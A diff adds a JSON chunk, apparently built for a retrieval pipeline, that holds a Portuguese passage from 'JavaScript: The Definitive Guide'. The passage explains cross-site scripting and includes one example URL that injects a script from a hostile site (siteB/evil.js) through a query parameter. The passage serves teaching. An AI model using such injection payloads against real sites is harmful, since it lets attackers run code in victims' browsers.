@@ -1,0 +1,9 @@
+{
+  "id": "JavaScript The Definitive Guide (David Flanagan)_chunk_1858",
+  "content": "ra sinais de menor \ne maior)! Nesse caso, o script injetado simplesmente exibe uma caixa de diálogo, o que é relativa-\nmente benigno. Mas considere este caso:\nhttp://siteA/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E\nOs ataques de cross-site scripting são assim chamados porque mais de um site está envolvido. O site \nB (ou algum outro site C) inclui um link feito especialmente (como o anterior) para o site A, que \ninjeta um script do site B. O script evil.js é hospedado pelo site B mal-intencionado, mas agora está \nincorporado ao site A e pode fazer absolutamente qualquer coisa",
+  "metadata": {
+    "source": "/home/jonata/Documentos/typescript-langchain/tmp/JavaScript The Definitive Guide (David Flanagan).pdf",
+    "chunkIndex": 1858,
+    "totalChunks": 10000
+  }
+}
